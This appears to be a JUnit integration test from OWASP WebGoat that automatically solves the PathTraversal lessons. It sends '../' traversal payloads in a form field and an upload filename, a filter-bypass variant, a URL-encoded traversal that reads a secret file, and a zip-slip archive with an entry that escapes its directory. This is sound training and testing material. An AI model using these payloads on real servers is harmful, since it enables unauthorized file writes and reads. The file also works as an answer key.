package org.owasp.webgoat;

import io.restassured.RestAssured;
import lombok.SneakyThrows;
import org.hamcrest.CoreMatchers;
import org.hamcrest.MatcherAssert;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DynamicTest;
import org.junit.jupiter.api.TestFactory;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.security.core.token.Sha512DigestUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.junit.jupiter.api.DynamicTest.dynamicTest;

class PathTraversalITTest extends IntegrationTest {

    @TempDir
    Path tempDir;

    private File fileToUpload = null;

    @BeforeEach
    @SneakyThrows
    public void init() {
        fileToUpload = Files.createFile(tempDir.resolve("test.jpg")).toFile();
        Files.write(fileToUpload.toPath(), "This is a test".getBytes());
        startLesson("PathTraversal");
    }

    @TestFactory
    Iterable<DynamicTest> testPathTraversal() {
        return Arrays.asList(
                dynamicTest("assignment 1 - profile upload", () -> assignment1()),
                dynamicTest("assignment 2 - profile upload fix", () -> assignment2()),
                dynamicTest("assignment 3 - profile upload remove user input", () -> assignment3()),
                dynamicTest("assignment 4 - profile upload random pic", () -> assignment4()),
                dynamicTest("assignment 5 - zip slip", () -> assignment5())
        );
    }

    private void assignment1() throws IOException {
        MatcherAssert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFile", "test.jpg", Files.readAllBytes(fileToUpload.toPath()))
                        .param("fullName", "../John Doe")
                        .post("/WebGoat/PathTraversal/profile-upload")
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }

    private void assignment2() throws IOException {
        MatcherAssert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFileFix", "test.jpg", Files.readAllBytes(fileToUpload.toPath()))
                        .param("fullNameFix", "..././John Doe")
                        .post("/WebGoat/PathTraversal/profile-upload-fix")
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }

    private void assignment3() throws IOException {
        MatcherAssert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFileRemoveUserInput", "../test.jpg", Files.readAllBytes(fileToUpload.toPath()))
                        .post("/WebGoat/PathTraversal/profile-upload-remove-user-input")
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }

    private void assignment4() throws IOException {
        var uri = "/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret";
        RestAssured.given().urlEncodingEnabled(false)
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(uri)
                .then()
                .statusCode(200)
                .body(CoreMatchers.is("You found it submit the SHA-512 hash of your username as answer"));

        checkAssignment("/WebGoat/PathTraversal/random", Map.of("secret", Sha512DigestUtils.shaHex(getWebgoatUser())), true);
    }

    private void assignment5() throws IOException {
        var webGoatHome = System.getProperty("java.io.tmpdir") + "/webgoat/PathTraversal/" + getWebgoatUser();
        webGoatHome = webGoatHome.replaceAll("^[a-zA-Z]:", ""); //Remove C: from the home directory on Windows

        var webGoatDirectory = new File(webGoatHome);
        var zipFile = new File(tempDir.toFile(), "upload.zip");
        try (var zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            ZipEntry e = new ZipEntry("../../../../../../../../../../" + webGoatDirectory.toString() + "/image.jpg");
            zos.putNextEntry(e);
            zos.write("test".getBytes(StandardCharsets.UTF_8));
        }
        MatcherAssert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFileZipSlip", "upload.zip", Files.readAllBytes(zipFile.toPath()))
                        .post("/WebGoat/PathTraversal/zip-slip")
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));

    }

    @AfterEach
    void shutdown() {
        //this will run only once after the list of dynamic tests has run, this is to test if the lesson is marked complete
        checkResults("/PathTraversal");
    }
}
